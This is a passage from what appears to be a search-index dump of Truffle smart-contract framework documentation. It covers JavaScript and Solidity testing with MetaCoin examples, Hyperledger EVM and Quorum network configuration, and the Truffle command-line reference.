abstraction for a specific Solidity contract. As you'll see in the example below, you can then use this abstraction to make sure your contracts are working properly. For more information on using contract abstractions, see the Interacting With Your Contracts section.", "title": "Use contract abstractions within your tests"}, {"location": "docs/truffle/how-to/debug-test/write-tests-in-javascript/#using-artifactsrequire", "text": "Using artifacts.require() within your tests works the same way as using it within your migrations; you just need to pass the name of the contract. See the artifacts.require() documentation in the Migrations section for detailed usage.", "title": "Using artifacts.require()"}, {"location": "docs/truffle/how-to/debug-test/write-tests-in-javascript/#using-web3", "text": "A web3 instance is available in each test file, configured to the correct provider. So calling web3.eth.getBalance just works!", "title": "Using web3"}, {"location": "docs/truffle/how-to/debug-test/write-tests-in-javascript/#examples", "text": "Here's an example test provided in the MetaCoin Truffle Box using async/await notation. Note the use of the contract() function, the accounts array for specifying available Ethereum accounts, and our use of artifacts.require() for interacting directly with our contracts. File: ./test/metacoin.js const MetaCoin = artifacts . require ( \"MetaCoin\" ); contract ( \"MetaCoin\" , ( accounts ) => { it ( \"should put 10000 MetaCoin in the first account\" , async () => { const metaCoinInstance = await MetaCoin . deployed (); const balance = await metaCoinInstance . getBalance . call ( accounts [ 0 ]); assert . equal ( balance . valueOf (), 10000 , \"10000 wasn't in the first account\" ); }); it ( \"should call a function that depends on a linked library\" , async () => { const metaCoinInstance = await MetaCoin . deployed (); const metaCoinBalance = ( await metaCoinInstance . getBalance . call ( accounts [ 0 ]) ). toNumber (); const metaCoinEthBalance = ( await metaCoinInstance . getBalanceInEth . call ( accounts [ 0 ]) ). toNumber (); assert . equal ( metaCoinEthBalance , 2 * metaCoinBalance , \"Library function returned unexpected function, linkage may be broken\" ); }); it ( \"should send coin correctly\" , async () => { const metaCoinInstance = await MetaCoin . deployed (); // Setup 2 accounts. const accountOne = accounts [ 0 ]; const accountTwo = accounts [ 1 ]; // Get initial balances of first and second account. const accountOneStartingBalance = ( await metaCoinInstance . getBalance . call ( accountOne ) ). toNumber (); const accountTwoStartingBalance = ( await metaCoinInstance . getBalance . call ( accountTwo ) ). toNumber (); // Make transaction from first account to second. const amount = 10 ; await metaCoinInstance . sendCoin ( accountTwo , amount , { from : accountOne }); // Get balances of first and second account after the transactions. const accountOneEndingBalance = ( await metaCoinInstance . getBalance . call ( accountOne ) ). toNumber (); const accountTwoEndingBalance = ( await metaCoinInstance . getBalance . call ( accountTwo ) ). toNumber (); assert . equal ( accountOneEndingBalance , accountOneStartingBalance - amount , \"Amount wasn't correctly taken from the sender\" ); assert . equal ( accountTwoEndingBalance , accountTwoStartingBalance + amount , \"Amount wasn't correctly sent to the receiver\" ); }); }); This test will produce the following output: Contract: MetaCoin \u221a should put 10000 MetaCoin in the first account (83ms) \u221a should call a function that depends on a linked library (43ms) \u221a should send coin correctly (122ms) 3 passing (293ms)", "title": "Examples"}, {"location": "docs/truffle/how-to/debug-test/write-tests-in-javascript/#specifying-tests", "text": "You can limit the tests being executed to a specific file as follows: truffle test ./test/metacoin.js See the full command reference for more information.", "title": "Specifying tests"}, {"location": "docs/truffle/how-to/debug-test/write-tests-in-javascript/#advanced", "text": "Truffle gives you access to Mocha's configuration so you can change how Mocha behaves. See the project configuration section for more details. Check out our documentation on interacting with your contracts for more tips, tricks and best practices.", "title": "Advanced"}, {"location": "docs/truffle/how-to/debug-test/write-tests-in-javascript/#typescript-file-support", "text": "Truffle supports tests saved as a .ts TypeScript file. Please see the Writing Tests in JavaScript guide for more information.", "title": "TypeScript File Support"}, {"location": "docs/truffle/how-to/debug-test/write-tests-in-solidity/", "text": "Write Solidity tests \u00b6 Solidity test contracts live alongside Javascript tests as .sol files. When truffle test is run, they will be included as a separate test suite per test contract. These contracts maintain all the benefits of the Javascript tests: namely a clean-room environment per test suite, direct access to your deployed contracts and the ability to import any contract dependency. In addition to these features, Truffle's Solidity testing framework was built with the following issues in mind: Solidity tests shouldn't extend from any contract (like a Test contract). This makes your tests as minimal as possible and gives you complete control over the contracts you write. Solidity tests shouldn't be beholden to any assertion library. Truffle provides a default assertion library for you, but you can change this library at any time to fit your needs. You should be able to run your Solidity tests against any Ethereum client. Example \u00b6 Let's take a look at an example Solidity test before diving too deeply. Here's the example Solidity test provided for you by truffle unbox metacoin : pragma solidity >= 0.4.25 < 0.6.0 ; import \"truffle/Assert.sol\" ; import \"truffle/DeployedAddresses.sol\" ; import \"../contracts/MetaCoin.sol\" ; contract TestMetaCoin { function testInitialBalanceUsingDeployedContract () { MetaCoin meta = MetaCoin ( DeployedAddresses . MetaCoin ()); uint expected = 10000 ; Assert . equal ( meta . getBalance ( tx.origin ), expected , \"Owner should have 10000 MetaCoin initially\" ); } function testInitialBalanceWithNewMetaCoin () { MetaCoin meta = new MetaCoin (); uint expected = 10000 ; Assert . equal ( meta . getBalance ( tx.origin ), expected , \"Owner should have 10000 MetaCoin initially\" ); } } This produces the following output: $ truffle test Compiling your contracts... =========================== > Compiling ./contracts/ConvertLib.sol > Compiling ./contracts/MetaCoin.sol > Compiling ./contracts/Migrations.sol > Compiling ./test/TestMetaCoin.sol TestMetaCoin \u2713 testInitialBalanceUsingDeployedContract (79ms) \u2713 testInitialBalanceWithNewMetaCoin (65ms) Contract: MetaCoin \u2713 should put 10000 MetaCoin in the first account (38ms) \u2713 should call a function that depends on a linked library (42ms) \u2713 should send coin correctly (120ms) 5 passing (7s) From the output, you can see reports from two different test files: one JavaScript (Contract: MetaCoin above) and one Solidity (TestMetaCoin above). In this document we will be concerning ourselves exclusively with the Solidity test. Test structure \u00b6 To better understand whats happening, let's discuss things in more detail. Assertions \u00b6 Your assertion functions like Assert.equal() are provided to you by the truffle/Assert.sol library. This is the default assertion library, however you can include your own assertion library so long as the library loosely integrates with Truffle's test runner by triggering the correct assertion events. You can find all available assertion functions in Assert.sol . Deployed addresses \u00b6 The addresses of your deployed contracts (i.e., contracts that were deployed as part of your migrations) are available through the truffle/DeployedAddresses.sol library. This is provided by Truffle and is recompiled and relinked before each suite is run to provide your tests with Truffle's a clean room environment. This library provides functions for all of your deployed contracts, in the form of: DeployedAddresses . < contract name > (); This will return an address that you can then use to access that contract. See the example test above for usage. In order to use the deployed contract, you'll have to import the contract code into your test suite. Notice import \"../contracts/MetaCoin.sol\"; in the example. This import is relative to the test contract, which exists in the ./test directory, and it goes outside of the test directory in order to find the MetaCoin contract. It then uses that contract to cast the address to the MetaCoin type. Test contract names \u00b6 All test contracts must start with Test , using an uppercase T . This distinguishes this contract apart from test helpers and project contracts (i.e., the contracts under test), letting the test runner know which contracts represent test suites. Test function names \u00b6 Like test contract names, all test functions must start with test , lowercase. Each test function is executed as a single transaction, in order of appearance in the test file (like your Javascript tests). Assertion functions provided by truffle/Assert.sol trigger events that the test runner evaluates to determine the result of the test. Assertion functions return a boolean representing the outcome of the assertion which you can use to return from the test early to prevent execution errors (as in, errors that Ganache or Truffle Develop will expose). before / after hooks \u00b6 You are provided many test hooks, shown in the example below. These hooks are beforeAll , beforeEach , afterAll and afterEach , which are the same hooks provided by Mocha in your Javascript tests. You can use these hooks to perform setup and teardown actions before and after each test, or before and after each suite is run. Like test functions, each hook is executed as a single transaction. Note that some complex tests will need to perform a significant amount of setup that might overflow the gas limit of a single transaction; you can get around this limitation by creating many hooks with different suffixes, like in the example below: import \"truffle/Assert.sol\" ; contract TestHooks { uint someValue ; function beforeEach () { someValue = 5 ; } function beforeEachAgain () { someValue += 1 ; } function testSomeValueIsSix () { uint expected = 6 ; Assert . equal ( someValue , expected , \"someValue should have been 6\" ); } } This test contract also shows that your test functions and hook functions all share the same contract state. You can setup contract data before the test, use that data during the test, and reset it afterward in preparation for the next one. Note that just like your Javascript tests, your next test function will continue from the state of the previous test function that ran. Advanced features \u00b6 Solidity tests come with a few advanced features to let you test specific use cases within Solidity. Testing for exceptions \u00b6 You can easily test if your contract should or shouldn't raise an exception (i.e., for require() / assert() / revert() statements; throw on previous versions of Solidity). This topic was first written about by guest writer Simon de la Rouviere in his tutorial Testing for Throws in Truffle Solidity Tests . N.B. that the tutorial makes heavy use of exceptions via the deprecated keyword throw , replaced by revert() , require() , and assert() starting in Solidity v0.4.13. Also, since Solidity v0.4.17, a function type member was added to enable you to access a function selector (e.g.: this.f.selector ), and so, testing for throws with external calls has been made much easier: pragma solidity ^ 0.5.0 ; import \"truffle/Assert.sol\" ; contract TestBytesLib2 { function testThrowFunctions () public { bool r ; // We're basically calling our contract externally with a raw call, forwarding all available gas, with // msg.data equal to the throwing function selector that we want to be sure throws and using only the boolean // value associated with the message call's success ( r , ) = address ( this ). call ( abi . encodePacked ( this . IThrow1 . selector )); Assert . isFalse ( r , \"If this is true, something is broken!\" ); ( r , ) = address ( this ). call ( abi . encodePacked ( this . IThrow2 . selector )); Assert . isFalse ( r , \"What?! 1 is equal to 10?\" ); } function IThrow1 () public pure { revert ( \"I will throw\" ); } function IThrow2 () public pure { require ( 1 == 10 , \"I will throw, too!\" ); } } Testing ether transactions \u00b6 You can also test how your contracts react to receiving Ether, and script that interaction within Solidity. To do so, your Solidity test should have a public function that returns a uint , called initialBalance . This can be written directly as a function or a public variable, as shown below. When your test contract is deployed to the network, Truffle will send that amount of Ether from your test account to your test contract. Your test contract can then use that Ether to script Ether interactions within your contract under test. Note that initialBalance is optional and not required. import \"truffle/Assert.sol\" ; import \"truffle/DeployedAddresses.sol\" ; import \"../contracts/MyContract.sol\" ; contract TestContract { // Truffle will send the TestContract one Ether after deploying the contract. uint public initialBalance = 1 ether ; function testInitialBalanceUsingDeployedContract () { MyContract myContract = MyContract ( DeployedAddresses . MyContract ()); // perform an action which sends value to myContract, then assert. myContract . send (...); } function () { // This will NOT be executed when Ether is sent. \\o/ } } Note that Truffle sends Ether to your test contract in a way that does not execute a fallback function, so you can still use the fallback function within your Solidity tests for advanced test cases.", "title": "Write tests with Solidity"}, {"location": "docs/truffle/how-to/debug-test/write-tests-in-solidity/#write-solidity-tests", "text": "Solidity test contracts live alongside Javascript tests as .sol files. When truffle test is run, they will be included as a separate test suite per test contract. These contracts maintain all the benefits of the Javascript tests: namely a clean-room environment per test suite, direct access to your deployed contracts and the ability to import any contract dependency. In addition to these features, Truffle's Solidity testing framework was built with the following issues in mind: Solidity tests shouldn't extend from any contract (like a Test contract). This makes your tests as minimal as possible and gives you complete control over the contracts you write. Solidity tests shouldn't be beholden to any assertion library. Truffle provides a default assertion library for you, but you can change this library at any time to fit your needs. You should be able to run your Solidity tests against any Ethereum client.", "title": "Write Solidity tests"}, {"location": "docs/truffle/how-to/debug-test/write-tests-in-solidity/#example", "text": "Let's take a look at an example Solidity test before diving too deeply. Here's the example Solidity test provided for you by truffle unbox metacoin : pragma solidity >= 0.4.25 < 0.6.0 ; import \"truffle/Assert.sol\" ; import \"truffle/DeployedAddresses.sol\" ; import \"../contracts/MetaCoin.sol\" ; contract TestMetaCoin { function testInitialBalanceUsingDeployedContract () { MetaCoin meta = MetaCoin ( DeployedAddresses . MetaCoin ()); uint expected = 10000 ; Assert . equal ( meta . getBalance ( tx.origin ), expected , \"Owner should have 10000 MetaCoin initially\" ); } function testInitialBalanceWithNewMetaCoin () { MetaCoin meta = new MetaCoin (); uint expected = 10000 ; Assert . equal ( meta . getBalance ( tx.origin ), expected , \"Owner should have 10000 MetaCoin initially\" ); } } This produces the following output: $ truffle test Compiling your contracts... =========================== > Compiling ./contracts/ConvertLib.sol > Compiling ./contracts/MetaCoin.sol > Compiling ./contracts/Migrations.sol > Compiling ./test/TestMetaCoin.sol TestMetaCoin \u2713 testInitialBalanceUsingDeployedContract (79ms) \u2713 testInitialBalanceWithNewMetaCoin (65ms) Contract: MetaCoin \u2713 should put 10000 MetaCoin in the first account (38ms) \u2713 should call a function that depends on a linked library (42ms) \u2713 should send coin correctly (120ms) 5 passing (7s) From the output, you can see reports from two different test files: one JavaScript (Contract: MetaCoin above) and one Solidity (TestMetaCoin above). In this document we will be concerning ourselves exclusively with the Solidity test.", "title": "Example"}, {"location": "docs/truffle/how-to/debug-test/write-tests-in-solidity/#test-structure", "text": "To better understand whats happening, let's discuss things in more detail.", "title": "Test structure"}, {"location": "docs/truffle/how-to/debug-test/write-tests-in-solidity/#assertions", "text": "Your assertion functions like Assert.equal() are provided to you by the truffle/Assert.sol library. This is the default assertion library, however you can include your own assertion library so long as the library loosely integrates with Truffle's test runner by triggering the correct assertion events. You can find all available assertion functions in Assert.sol .", "title": "Assertions"}, {"location": "docs/truffle/how-to/debug-test/write-tests-in-solidity/#deployed-addresses", "text": "The addresses of your deployed contracts (i.e., contracts that were deployed as part of your migrations) are available through the truffle/DeployedAddresses.sol library. This is provided by Truffle and is recompiled and relinked before each suite is run to provide your tests with Truffle's a clean room environment. This library provides functions for all of your deployed contracts, in the form of: DeployedAddresses . < contract name > (); This will return an address that you can then use to access that contract. See the example test above for usage. In order to use the deployed contract, you'll have to import the contract code into your test suite. Notice import \"../contracts/MetaCoin.sol\"; in the example. This import is relative to the test contract, which exists in the ./test directory, and it goes outside of the test directory in order to find the MetaCoin contract. It then uses that contract to cast the address to the MetaCoin type.", "title": "Deployed addresses"}, {"location": "docs/truffle/how-to/debug-test/write-tests-in-solidity/#test-contract-names", "text": "All test contracts must start with Test , using an uppercase T . This distinguishes this contract apart from test helpers and project contracts (i.e., the contracts under test), letting the test runner know which contracts represent test suites.", "title": "Test contract names"}, {"location": "docs/truffle/how-to/debug-test/write-tests-in-solidity/#test-function-names", "text": "Like test contract names, all test functions must start with test , lowercase. Each test function is executed as a single transaction, in order of appearance in the test file (like your Javascript tests). Assertion functions provided by truffle/Assert.sol trigger events that the test runner evaluates to determine the result of the test. Assertion functions return a boolean representing the outcome of the assertion which you can use to return from the test early to prevent execution errors (as in, errors that Ganache or Truffle Develop will expose).", "title": "Test function names"}, {"location": "docs/truffle/how-to/debug-test/write-tests-in-solidity/#before-after-hooks", "text": "You are provided many test hooks, shown in the example below. These hooks are beforeAll , beforeEach , afterAll and afterEach , which are the same hooks provided by Mocha in your Javascript tests. You can use these hooks to perform setup and teardown actions before and after each test, or before and after each suite is run. Like test functions, each hook is executed as a single transaction. Note that some complex tests will need to perform a significant amount of setup that might overflow the gas limit of a single transaction; you can get around this limitation by creating many hooks with different suffixes, like in the example below: import \"truffle/Assert.sol\" ; contract TestHooks { uint someValue ; function beforeEach () { someValue = 5 ; } function beforeEachAgain () { someValue += 1 ; } function testSomeValueIsSix () { uint expected = 6 ; Assert . equal ( someValue , expected , \"someValue should have been 6\" ); } } This test contract also shows that your test functions and hook functions all share the same contract state. You can setup contract data before the test, use that data during the test, and reset it afterward in preparation for the next one. Note that just like your Javascript tests, your next test function will continue from the state of the previous test function that ran.", "title": "before / after hooks"}, {"location": "docs/truffle/how-to/debug-test/write-tests-in-solidity/#advanced-features", "text": "Solidity tests come with a few advanced features to let you test specific use cases within Solidity.", "title": "Advanced features"}, {"location": "docs/truffle/how-to/debug-test/write-tests-in-solidity/#testing-for-exceptions", "text": "You can easily test if your contract should or shouldn't raise an exception (i.e., for require() / assert() / revert() statements; throw on previous versions of Solidity). This topic was first written about by guest writer Simon de la Rouviere in his tutorial Testing for Throws in Truffle Solidity Tests . N.B. that the tutorial makes heavy use of exceptions via the deprecated keyword throw , replaced by revert() , require() , and assert() starting in Solidity v0.4.13. Also, since Solidity v0.4.17, a function type member was added to enable you to access a function selector (e.g.: this.f.selector ), and so, testing for throws with external calls has been made much easier: pragma solidity ^ 0.5.0 ; import \"truffle/Assert.sol\" ; contract TestBytesLib2 { function testThrowFunctions () public { bool r ; // We're basically calling our contract externally with a raw call, forwarding all available gas, with // msg.data equal to the throwing function selector that we want to be sure throws and using only the boolean // value associated with the message call's success ( r , ) = address ( this ). call ( abi . encodePacked ( this . IThrow1 . selector )); Assert . isFalse ( r , \"If this is true, something is broken!\" ); ( r , ) = address ( this ). call ( abi . encodePacked ( this . IThrow2 . selector )); Assert . isFalse ( r , \"What?! 1 is equal to 10?\" ); } function IThrow1 () public pure { revert ( \"I will throw\" ); } function IThrow2 () public pure { require ( 1 == 10 , \"I will throw, too!\" ); } }", "title": "Testing for exceptions"}, {"location": "docs/truffle/how-to/debug-test/write-tests-in-solidity/#testing-ether-transactions", "text": "You can also test how your contracts react to receiving Ether, and script that interaction within Solidity. To do so, your Solidity test should have a public function that returns a uint , called initialBalance . This can be written directly as a function or a public variable, as shown below. When your test contract is deployed to the network, Truffle will send that amount of Ether from your test account to your test contract. Your test contract can then use that Ether to script Ether interactions within your contract under test. Note that initialBalance is optional and not required. import \"truffle/Assert.sol\" ; import \"truffle/DeployedAddresses.sol\" ; import \"../contracts/MyContract.sol\" ; contract TestContract { // Truffle will send the TestContract one Ether after deploying the contract. uint public initialBalance = 1 ether ; function testInitialBalanceUsingDeployedContract () { MyContract myContract = MyContract ( DeployedAddresses . MyContract ()); // perform an action which sends value to myContract, then assert. myContract . send (...); } function () { // This will NOT be executed when Ether is sent. \\o/ } } Note that Truffle sends Ether to your test contract in a way that does not execute a fallback function, so you can still use the fallback function within your Solidity tests for advanced test cases.", "title": "Testing ether transactions"}, {"location": "docs/truffle/how-to/distributed-ledger-support/hyperledger-evm/", "text": "Work with Hyperledger EVM \u00b6 As of version 5.0.27 , Truffle supports development with Hyperledger Fabric's EVM chaincode, a permissioned version of Ethereum. Configuration \u00b6 To use Fabric EVM, you must modify your network in truffle-config.js to include a parameter type set to \"fabric-evm\" . See the example below. module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 5000 , // default Fab3 port network_id : \"*\" , type : \"fabric-evm\" } } };", "title": "Work with Hyperledger EVM"}, {"location": "docs/truffle/how-to/distributed-ledger-support/hyperledger-evm/#work-with-hyperledger-evm", "text": "As of version 5.0.27 , Truffle supports development with Hyperledger Fabric's EVM chaincode, a permissioned version of Ethereum.", "title": "Work with Hyperledger EVM"}, {"location": "docs/truffle/how-to/distributed-ledger-support/hyperledger-evm/#configuration", "text": "To use Fabric EVM, you must modify your network in truffle-config.js to include a parameter type set to \"fabric-evm\" . See the example below. module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 5000 , // default Fab3 port network_id : \"*\" , type : \"fabric-evm\" } } };", "title": "Configuration"}, {"location": "docs/truffle/how-to/distributed-ledger-support/quorum/", "text": "Working with Quorum \u00b6 Truffle supports development with Quorum, a version of Ethereum that adds new features on top of what Ethereum already provides. Specifically, Quorum adds the ability to create private blockchains between select participants, and more importantly adds transaction privacy on top of normal Ethereum transactions. It is highly recommended you read our tutorial on building a dapp on Quorum before using Truffle with Quorum. Both the tutorial and this page have been updated for at least version 5.0.9 of truffle . Known issues \u00b6 Quorum support was completely broken in version 5.0.0 , and basic support was restored in 5.0.9 . Make sure you have at least 5.0.9 . Privacy support (via privateFor ) has been restored in 5.0.14 . You must use at least 5.0.14 or v4 ( npm i -g truffle@v4 ) to use privacy features. Configuration \u00b6 To use Quorum, you must modify your network in truffle-config.js to include a parameter type set to \"quorum\" . See the example below. module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 22000 , // replace with quorum node port you wish to connect to network_id : \"*\" , type : \"quorum\" } } }; Use privacy features \u00b6 Privacy features have been restored in Truffle 5.0.14 . They are also available in v4 . Please refer to the Quorum tutorial to learn more about how to use the privacy features within Quorum. Here are some quick references for privacy within the tutorial: - Deploying contracts privately - Making transactions private - Interacting with your contracts privately .", "title": "Work with Quorum"}, {"location": "docs/truffle/how-to/distributed-ledger-support/quorum/#working-with-quorum", "text": "Truffle supports development with Quorum, a version of Ethereum that adds new features on top of what Ethereum already provides. Specifically, Quorum adds the ability to create private blockchains between select participants, and more importantly adds transaction privacy on top of normal Ethereum transactions. It is highly recommended you read our tutorial on building a dapp on Quorum before using Truffle with Quorum. Both the tutorial and this page have been updated for at least version 5.0.9 of truffle .", "title": "Working with Quorum"}, {"location": "docs/truffle/how-to/distributed-ledger-support/quorum/#known-issues", "text": "Quorum support was completely broken in version 5.0.0 , and basic support was restored in 5.0.9 . Make sure you have at least 5.0.9 . Privacy support (via privateFor ) has been restored in 5.0.14 . You must use at least 5.0.14 or v4 ( npm i -g truffle@v4 ) to use privacy features.", "title": "Known issues"}, {"location": "docs/truffle/how-to/distributed-ledger-support/quorum/#configuration", "text": "To use Quorum, you must modify your network in truffle-config.js to include a parameter type set to \"quorum\" . See the example below. module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 22000 , // replace with quorum node port you wish to connect to network_id : \"*\" , type : \"quorum\" } } };", "title": "Configuration"}, {"location": "docs/truffle/how-to/distributed-ledger-support/quorum/#use-privacy-features", "text": "Privacy features have been restored in Truffle 5.0.14 . They are also available in v4 . Please refer to the Quorum tutorial to learn more about how to use the privacy features within Quorum. Here are some quick references for privacy within the tutorial: - Deploying contracts privately - Making transactions private - Interacting with your contracts privately .", "title": "Use privacy features"}, {"location": "docs/truffle/reference/command-line-options/", "text": "Command line options \u00b6 This section will describe every command available in the Truffle application. Usage \u00b6 All commands are in the following form: truffle <command> [ options ] Passing no arguments is equivalent to truffle help , which will display a list of all commands and then exit. Available commands \u00b6 build \u00b6 Execute build pipeline (if configuration present). truffle build Requires the build key to be present in the configuration. See the Build processes sections for more details. Warning : The build command and this approach is being deprecated. Please use third-party build tools like webpack or grunt, or see our Truffle Boxes for an example. compile \u00b6 Compile contract source files. truffle compile [ --list <filter> ] [ --all ] [ --network <name> ] [ --quiet ] This will only compile contracts that have changed since the last compile, unless otherwise specified. Options: --list <filter> : List all recent stable releases from solc-bin. If filter is specified then it will display only that type of release or docker tags. The filter parameter must be one of the following: pre-releases, releases, latestRelease or docker. --all : Compile all contracts instead of only the contracts changed since last compile. --network <name> : Specify the network to use, saving artifacts specific to that network. Network name must exist in the configuration. --quiet : Suppress all compilation output. config \u00b6 Displays and sets user-level configuration options. truffle config [ --enable-analytics | --disable-analytics ] [[ <get | set> <key> ] [ <list> ] [ <value-for-set> ]] Options: --enable-analytics|--disable-analytics : Enable or disable analytics. get : Get a Truffle configuration option value. set : Set a Truffle configuration option value. list : List all Truffle configuration option values. console \u00b6 Run a console with contract abstractions and commands available. truffle console [ --network <name> | --url <url endpoint> ] [ --verbose-rpc ] Spawns an interface to interact with contracts via the command line. Additionally, many Truffle commands are available within the console (without the truffle prefix). Requires an external Ethereum client, such as Ganache or geth. For a console that creates a development and test environment, use truffle develop . See the Using Truffle Develop and the Console section for more details. Options: --network <name> : Specify the network to use. Network name must exist in the configuration. --url <url endpoint> : Specify the Ethereum client endpoint to connect to. --verbose-rpc : Log communication between Truffle and the Ethereum client. create \u00b6 Helper to create new contracts, migrations and tests. truffle create <artifact_type> <ArtifactName> Options: <artifact_type> : Create a new artifact, where artifact_type is one of the following: contract , migration , test , or all . The new artifact is created along with one of the following files: contracts/ArtifactName.sol , migrations/####_artifact_name.js or tests/artifact_name.js . Using truffle create all will create all three. (required) <ArtifactName> : Name of new artifact. (required) Camel case names of artifacts will be converted to underscore-separated file names for the migrations and tests. Number prefixes for migrations are automatically generated. dashboard \u00b6 Start and open an instance of the Truffle dashboard. truffle dashboard [ --port <number> ] [ --host <string> ] [ --verbose ] Options: --port <number> : Port to start the Truffle dashboard on (default 24012 ). --host <string> : Host to start the Truffle dashboard on (default localhost ). --verbose : Start the Truffle dashboard with additional verbose logging (default false ) It is also possible to specify these options in the truffle-config.js file under \"dashboard\" . For example: module . exports = { // ... rest of truffle config dashboard : { port : 25012 , host : \"localhost\" , verbose : true } } When specifying options in the config file and in the CLI, the options provided in the CLI take precedence. debug \u00b6 Interactively debug any transaction on the blockchain. truffle debug [ <transaction_hash> ] [ --network <network> | --url <provider_url> ] [ --fetch-external ] [ --compile-tests | --compile-all | --compile-none ] Will start an interactive debugging session on a particular transaction. Allows you to step through each action and replay. See Using the truffle debugger for more details. Options: <transaction_hash> : Transaction ID to use for debugging. You can omit this to simply start the debugger and then load a transaction later. --network : The network to connect to. --url : Allows you to specify a provider URL to connect to, in place of --network . If this option is used, the debugger may be used outside of a Truffle project. --fetch-external : Allows the debugger to download source from source verification services to debug transactions involving external contracts. When used, a transaction hash is required. May be abbreviated -x . --compile-tests : Allows the debugger to compile Solidity test contracts . Implies --compile-all . --compile-all : Forces the debugger to recompile all contracts, even when it would otherwise judge doing so unnecessary. Compilation results are not saved. --compile-none : Forces the debugger not to recompile contracts, even when it would otherwise judge it necessary. This option is dangerous and may cause errors. Please only use this if you are sure a recompilation is not necessary. deploy \u00b6 Alias for migrate . See migrate for details. develop \u00b6 Open a console with a development blockchain truffle develop [ --log ] Spawns a local development blockchain, and allows you to interact with contracts via the command line. Additionally, many Truffle commands are available within the console (without the truffle prefix). If you want an interactive console but want to use an existing blockchain, use truffle console . See the Using the console section for more details. Option: --log : Start/Connect to a Truffle develop session and log all RPC activity. See the Log RPC Activity docs for more information about using this option. exec \u00b6 Execute a JS module within the Truffle environment. truffle exec <script.js> [ --network <name> ] [ --compile ] This will include web3 , set the default provider based on the network specified (if any), and include your contracts as global objects while executing the script. Your script must export a function that Truffle can run. See the Writing external scripts section for more details. Options: <script.js> : JavaScript file to be executed. Can include path information if the script does not exist in the current directory. (required) --network <name> : Specify the network to use, using artifacts specific to that network. Network name must exist in the configuration. --compile : Compile contracts before executing the script. help \u00b6 Display a list of all commands or information about a specific command. truffle help [ <command> ] Option: <command> : Display usage information about the specified command. init \u00b6 Initialize new and empty Ethereum project truffle init [ --force ] Creates a new and empty Truffle project within the current working directory. Alert : Older versions of Truffle used `truffle init bare` to create an empty project. This usage has been deprecated. Those looking for the MetaCoin example that used to be available through `truffle init` should use `truffle unbox MetaCoin` instead. Option: --force : Initialize project regardless of the current working directory's state. Be careful, this could overwrite existing files that have name conflicts. install \u00b6 Install a package from the Ethereum Package Registry. truffle install <package_name> [ @<version> ] Options: <package_name> : Name of the package as listed in the Ethereum Package Registry. (required) @<version> : When specified, will install a specific version of the package, otherwise will install the latest version. migrate \u00b6 Run migrations to deploy contracts. truffle migrate [ --reset ] [ --f <number> ] [ --to <number> ] [ --network <name> ] [ --compile-all ] [ --verbose-rpc ] [ --dry-run ] [ --interactive ] [ --skip-dry-run ] [ --describe-json ] Unless specified, this will run from the last completed migration. See the Migrations section for more details. Options: --reset : Run all migrations from the beginning, instead of running from the last completed migration. --f <number> : Run contracts from a specific migration. The number refers to the prefix of the migration file. --to <number> : Run contracts to a specific migration. The number refers to the prefix of the migration file. --network <name> : Specify the network to use, saving artifacts specific to that network. Network name must exist in the configuration. --compile-all : Compile all contracts instead of intelligently choosing which contracts need to be compiled. --verbose-rpc : Log communication between Truffle and the Ethereum client. --dry-run : Fork the network specified and only perform a test migration. --skip-dry-run : Skip the test migration performed before the real migration. --interactive : Prompt to confirm that the user wants to proceed after the dry run. --describe-json : Prints additional status messages. networks \u00b6 Show addresses for deployed contracts on each network. truffle networks [ --clean ] Use this command before publishing your package to see if there are any extraneous network artifacts you don't want published. With no options specified, this package will simply output the current artifact state. Option: --clean : Remove all network artifacts that aren't associated with a named network. obtain \u00b6 Fetch and cache a specified compiler. truffle obtain [ --solc <version> ] Option: --solc : Download and cache a version of the solc compiler. (required) opcode \u00b6 Print the compiled opcodes for a given contract. truffle opcode <contract_name> Option: <contract_name> : Name of the contract to print opcodes for. Must be a contract name, not a file name. (required) preserve \u00b6 Preserve files and content to decentralized storage platforms such as IPFS or Filecoin. truffle preserve <path> --<recipe> [ --environment <name> ] Options: --ipfs : Preserve files to IPFS --filecoin : Preserve files to Filecoin --buckets : Preserve files to Textile Buckets --<recipe> : Preserve files using an installed plugin with the specified recipe tag --environment <name> : Specify the environment to use (defined in truffle-config.js ) (default: \"development\") Custom options for these \"preserve recipes\" can be provided through environments . Additional preserve recipes can be installed through NPM and configured as Truffle plugins . More information about usage, configuration and installation of preserve recipes can be found on the dedicated documentation page . publish \u00b6 Publish a package to the Ethereum Package Registry. truffle publish All parameters are pulled from your project's configuration file. Takes no arguments. run \u00b6 Note : This feature is new and still in a barebones state. Please let us know how we can improve it! Run a third-party plugin command truffle run <command> Option: <command> : Name of a command defined by an installed plugin. (required) Install plugins as NPM package dependencies and configure Truffle to recognize the plugin. For more information, see Third-Party Plugin Commands . test \u00b6 Run JavaScript and Solidity tests. truffle test [ <test_file> ] [ --compile-all [ -debug ]] [ --network <name> ] [ --verbose-rpc ] [ --show-events ] [ --debug ] [ --debug-global <identifier> ] [ --bail ] [ --stacktrace [ -extra ]] Runs some or all tests within the test/ directory as specified. See the section on Testing your contracts for more information. Options: <test_file> : Name of the test file to be run. Can include path information if the file does not exist in the current directory. --compile-all : Compile all contracts instead of intelligently choosing which contracts need to be compiled. --compile-all-debug : Like --compile-all , but compiles contracts in debug mode for extra information. Has no effect on Solidity <0.6.3. --network <name> : Specify the network to use, using artifacts specific to that network. Network name must exist in the configuration. --verbose-rpc : Log communication between Truffle and the Ethereum client. --show-events : Log all contract events. --debug : Provides global debug() function for in-test debugging. Usable with Javascript tests only; implies --compile-all . --debug-global <identifier> : Allows one to rename the debug() function to something else. --bail : Bail after the first test failure. May be abbreviated -b . --stacktrace : Allows for mixed Javascript-and-Solidity stacktraces when a Truffle Contract transaction or deployment reverts. Does not apply to calls or gas estimates. Implies --compile-all . May be abbreviated -t . Warning: This option is still somewhat experimental. --stacktrace-extra : Shortcut for --stacktrace --compile-all-debug . unbox \u00b6 Download a Truffle Box, a pre-built Truffle project. truffle unbox <box_name> [ <destination_path> ] [ --force ] Downloads a Truffle Box to destination_path if provided. Truffle defaults to the current working directory if this argument is not provided. See the list of available Truffle boxes . You can also design and create your own boxes! See the section on Truffle boxes for more information. Options: <box_name> : Name of the Truffle Box. (required) --force : Unbox project in the current directory regardless of its state. Be careful, this will potentially overwrite files that exist in the directory. Note : box_name can be one of several formats: \\<truffleBoxName> - like metacoin (see the official Truffle boxes here ) \\<gitOrgName/repoName> - like truffle-box/bare-box (your repo will have to have the proper structure - see our page on creating a 